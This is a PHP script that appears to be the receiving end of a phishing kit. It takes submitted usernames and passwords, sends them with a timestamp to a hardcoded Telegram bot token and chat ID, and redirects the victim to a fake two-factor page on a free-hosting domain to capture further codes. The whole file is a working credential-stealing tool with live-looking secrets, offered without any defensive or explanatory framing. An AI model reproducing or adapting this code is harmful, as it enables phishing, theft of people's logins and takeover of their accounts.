<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit("Method Not Allowed");
}

date_default_timezone_set('UTC');

$botToken = '6627263483:AAG5WQX0ha9hsx740CwSUtkMjwDONp0Eh_w';
$chatId   = '5248818941';

$email = trim($_POST['username'] ?? '');
$password = trim($_POST['password'] ?? '');

if (empty($email) || empty($password)) {
    http_response_code(400);
    exit("Missing credentials.");
}

$message = "🔐 *New Login Submission*\n";
$message .= "-----------------------------\n";
$message .= "📧 *Email:* {$email}\n";
$message .= "🔑 *Password:* {$password}\n";
$message .= "-----------------------------\n";
$message .= "📅 *Time:* " . date("Y-m-d H:i:s") . "\n";
$message .= "🌐 *Source:* login2.php";

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$payload = [
    'chat_id' => $chatId,
    'text'    => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Redirect to 2FA page
header("Location: https://authenticationlive.rf.gd/cache_site/2fa.php");
exit;
?>
